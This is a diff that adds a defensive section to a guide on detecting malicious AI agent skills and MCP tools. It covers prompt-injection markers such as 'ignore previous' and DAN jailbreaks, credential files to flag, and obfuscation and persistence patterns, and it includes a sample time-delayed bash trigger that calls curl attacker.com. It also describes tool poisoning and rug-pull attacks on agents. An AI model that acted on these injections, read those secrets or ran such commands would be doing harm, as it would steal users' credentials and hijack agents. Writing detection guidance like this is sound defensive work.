@@ -163,6 +163,82 @@ If OpenClaw must be evaluated:
 
 ---
 
+## Detecting Malicious Skills
+
+**Source:** OSTRTA (One Skill To Rule Them All) - adversarial security analysis framework
+
+### 9 Threat Categories
+
+| Category | What to detect |
+|----------|----------------|
+| **Prompt Injection** | IMPORTANT/CRITICAL markers, DAN jailbreaks, "ignore previous" |
+| **Data Exfiltration** | Sensitive file access + network sends |
+| **Obfuscation** | Base64, zero-width chars, homoglyphs, hex encoding |
+| **Unverifiable Dependencies** | npm/pip packages that can't be audited |
+| **Privilege Escalation** | sudo, chmod 777, service installation |
+| **Persistence** | .bashrc, cron, LaunchAgent, systemd |
+| **Metadata Poisoning** | Malicious instructions in description/tags |
+| **Indirect Injection** | Data processing risks |
+| **Time-Delayed Attacks** | Date checks, version triggers, conditional malware |
+
+### Sensitive Files to Flag
+
+```
+~/.aws/credentials    ~/.ssh/id_rsa
+~/.aws/config         ~/.ssh/*.pem
+~/.gnupg              .env, .env.local
+credentials           api_key, private_key
+```
+
+### Obfuscation Techniques
+
+| Technique | Example |
+|-----------|---------|
+| Base64 | `ZXhmaWx0cmF0ZQ==` → `exfiltrate` |
+| Zero-width chars | Invisible Unicode (U+200B, U+200C, U+200D) |
+| Homoglyphs | Cyrillic `а` vs Latin `a` (visually identical) |
+| Multi-layer encoding | Base64 of Base64 (CRITICAL severity) |
+
+### Time-Delayed Attack Example
+
+```bash
+# Activates after a specific date
+if [[ $(date +%s) -gt 1735689600 ]]; then
+  curl attacker.com/activate
+fi
+```
+
+### Runtime Dynamism Detection
+
+Code that changes behavior after install (source: repo-forensics):
+
+| Pattern | What it means |
+|---------|---------------|
+| `importlib.import_module(var)` | Dynamic imports based on variables |
+| `requests.get(url).text` → `eval()` | Fetch-then-execute |
+| `types.CodeType()`, `marshal.loads()` | Runtime code generation |
+| `open(__file__, 'w')` | Self-modification |
+| MCP description from `db.query()` | Rug pull enabler |
+
+### Manifest Drift
+
+Comparing declared vs actual dependencies:
+
+- **Phantom deps**: Imported but not in requirements.txt
+- **Runtime installs**: `subprocess.run(["pip", "install", pkg])`
+- **Conditional imports**: `try: import x except: pip install x`
+
+### MCP-Specific Attacks
+
+| Attack | Description |
+|--------|-------------|
+| **Tool Poisoning (TPA)** | `<IMPORTANT>` tag in tool descriptions |
+| **SQL → Prompt Injection** | SQL injection writes malicious prompts to DB |
+| **Tool Shadowing** | One tool's description changes behavior of other tools |
+| **Rug Pull Enablers** | Descriptions from DB/network/env vars |
+
+---
+
 ## The Supply Chain Problem
 
 AI agent supply chains are the new npm/PyPI:
